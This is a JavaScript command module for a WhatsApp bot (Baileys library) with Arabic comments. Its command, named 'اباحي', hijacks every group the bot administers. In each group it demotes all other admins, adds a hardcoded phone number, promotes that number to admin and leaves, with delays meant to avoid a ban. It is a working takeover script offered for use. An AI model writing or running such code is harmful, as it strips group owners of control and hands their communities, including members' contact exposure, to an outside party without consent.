const fs = require('fs');
const { jidDecode } = require('@whiskeysockets/baileys');
const { eliteNumbers } = require('../haykala/elite.js');

const decode = jid => (jidDecode(jid)?.user || jid.split('@')[0]) + '@s.whatsapp.net';

module.exports = {
  command: 'اباحي',
  description: 'زرف جميع جروبات البوت وإضافة الرقم المحدد كمشرف (بالترتيب من الأكبر للأصغر)',
  usage: '.اباحي',
  category: 'DEVELOPER',

  async execute(sock, msg) {
    try {
      const sender = decode(msg.key.participant || msg.key.remoteJid);
      const senderLid = sender.split('@')[0];

      // السماح للنخبة بس يستخدموه
      if (!eliteNumbers.includes(senderLid)) {
        return await sock.sendMessage(msg.key.remoteJid, { 
          text: '🚫 هذا الأمر مسموح للنخبة فقط.' 
        }, { quoted: msg });
      }

      await sock.sendMessage(msg.key.remoteJid, { 
        react: { text: '🎯', key: msg.key } 
      });

      // الحصول على جميع الجروبات
      const allGroups = await sock.groupFetchAllParticipating();
      
      // تحويل الكائن إلى مصفوفة وترتيبها حسب عدد الأعضاء (من الأكبر للأصغر)
      const sortedGroups = Object.values(allGroups).sort((a, b) => {
        const countA = a.participants ? a.participants.length : 0;
        const countB = b.participants ? b.participants.length : 0;
        return countB - countA; 
      });

      await sock.sendMessage(msg.key.remoteJid, { 
        text: `🚀 بدء عملية الزرف لجميع الجروبات (بالترتيب من الأكبر للـ أصغر)...\n📊 عدد الجروبات: ${sortedGroups.length}` 
      }, { quoted: msg });

      let successCount = 0;
      let failCount = 0;

      // زرف كل جروب بالترتيب الجديد
      for (const group of sortedGroups) {
        const groupId = group.id;
        try {
          const groupMetadata = await sock.groupMetadata(groupId);
          const groupName = groupMetadata.subject;
          const participantCount = groupMetadata.participants.length;
          
          await sock.sendMessage(msg.key.remoteJid, { 
            text: `⚡ معالجة الجروب: ${groupName}\n👥 الأعضاء: ${participantCount}` 
          });

          // نزول جميع المشرفين إلى أعضاء عاديين (باستثناء البوت نفسه لتجنب فقدان الصلاحية أثناء العملية)
          const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          const allAdmins = groupMetadata.participants.filter(p => p.admin && p.id !== myJid);
          
          if (allAdmins.length > 0) {
            const adminIds = allAdmins.map(p => p.id);
            await sock.groupParticipantsUpdate(groupId, adminIds, 'demote').catch(() => {});
          }

          await new Promise(resolve => setTimeout(resolve, 300));

          // إضافة الرقم كمسؤول
          try {
            const targetNumber = '201115096403@s.whatsapp.net';
            await sock.groupParticipantsUpdate(groupId, [targetNumber], 'add').catch(() => {});
            await new Promise(resolve => setTimeout(resolve, 300));
            await sock.groupParticipantsUpdate(groupId, [targetNumber], 'promote').catch(() => {});
          } catch (err) {
            // تجاهل أخطاء الإضافة
          }

          await new Promise(resolve => setTimeout(resolve, 100));

          // مغادرة البوت من الجروب
          await sock.groupLeave(groupId);
          
          successCount++;
          await sock.sendMessage(msg.key.remoteJid, { 
            text: `✅ تم زرف الجروب: ${groupName}` 
          });

        } catch (err) {
          failCount++;
          console.error(`❌ خطأ في زرف الجروب ${groupId}:`, err);
        }

        // انتظار بين كل جروب لتجنب الحظر
        await new Promise(resolve => setTimeout(resolve, 500));
      }

      // تقرير نهائي
      await sock.sendMessage(msg.key.remoteJid, { 
        text: `🎉 تم الانتهاء من زرف جميع الجروبات!\n\n` +
              `✅ الجروبات المزروفة: ${successCount}\n` +
              `❌ الجروبات الفاشلة: ${failCount}\n` +
              `📊 الإجمالي: ${sortedGroups.length}\n\n` +
              `🛡️ تم إضافة الرقم كمشرف في جميع الجروبات`
      }, { quoted: msg });

    } catch (err) {
      console.error('❌ خطأ في الزرف:', err);
      await sock.sendMessage(msg.key.remoteJid, { 
        react: { text: '❌', key: msg.key } 
      });
      await sock.sendMessage(msg.key.remoteJid, { 
        text: `❌ حصل خطأ أثناء الزرف:\n\n${err.message || err.toString()}` 
      }, { quoted: msg });
    }
  }
};
